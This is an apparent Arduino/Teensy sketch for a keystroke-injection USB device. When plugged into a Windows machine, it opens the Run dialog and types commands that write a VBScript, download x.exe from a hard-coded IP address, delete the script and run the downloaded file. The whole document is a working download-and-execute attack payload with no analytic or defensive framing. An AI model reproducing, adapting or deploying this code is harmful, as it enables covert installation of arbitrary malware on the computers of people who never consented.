
int myKeyBreak = 50;

void setup() {
  delay(5000);
  omg("cmd.exe");
  delay(500);
  println("del x.exe");
  delay(myKeyBreak);
  println("echo strFileURL = \"http://54.152.203.153/x.exe\" > omg.vbs");
  delay(myKeyBreak);
  println("echo strHDLocation = \"x.exe\" >> omg.vbs");
  delay(myKeyBreak);
  println("echo Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\") >> omg.vbs");
  delay(myKeyBreak);
  println("echo objXMLHTTP.open \"GET\", strFileURL, false >> omg.vbs");
  delay(myKeyBreak);
  println("echo objXMLHTTP.send() >> omg.vbs");
  delay(myKeyBreak);
  println("echo If objXMLHTTP.Status = 200 Then >> omg.vbs");
  delay(myKeyBreak);
  println("echo Set objADOStream = CreateObject(\"ADODB.Stream\") >> omg.vbs");
  delay(myKeyBreak);
  println("echo objADOStream.Open >> omg.vbs");
  delay(myKeyBreak);
  println("echo objADOStream.Type = 1 >> omg.vbs");
  delay(myKeyBreak);
  println("echo objADOStream.Write objXMLHTTP.ResponseBody >> omg.vbs");
  delay(myKeyBreak);
  println("echo objADOStream.Position = 0 >> omg.vbs");
  delay(myKeyBreak);
  println("echo Set objFSO = Createobject(\"Scripting.FileSystemObject\") >> omg.vbs");
  delay(myKeyBreak);
  println("echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation >> omg.vbs");
  delay(myKeyBreak);
  println("echo Set objFSO = Nothing >> omg.vbs");
  delay(myKeyBreak);
  println("echo objADOStream.SaveToFile strHDLocation >> omg.vbs");
  delay(myKeyBreak);
  println("echo objADOStream.Close >> omg.vbs");
  delay(myKeyBreak);
  println("echo Set objADOStream = Nothing >> omg.vbs");
  delay(myKeyBreak);
  println("echo End if >> omg.vbs");
  delay(myKeyBreak);
  println("echo Set objXMLHTTP = Nothing >> omg.vbs");
  delay(myKeyBreak);
  println("exit");
  delay(1000);
  omg("cmd /c cscript omg.vbs");
  delay(8000);
  omg("cmd /c del omg.vbs");
  delay(1000);
  omg("cmd /c x.exe");
  delay(1000000);
}

void loop() {
  
}

void println(String string)
{
  type_cmd(string);
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  delay(100);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(100);
}

void type_cmd(String SomeCommand) 
{
  Keyboard.begin();
  delay(400);
  Keyboard.print(SomeCommand); 
  delay(400);
  Keyboard.releaseAll();
}

void omg(String SomeCommand)
{
  Keyboard.set_modifier(128); 
  Keyboard.set_key1(KEY_R);
  Keyboard.send_now(); 
  Keyboard.set_modifier(0); 
  Keyboard.set_key1(0); 
  Keyboard.send_now(); 
  delay(1500);
  type_cmd(SomeCommand);
  Keyboard.releaseAll();
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
}
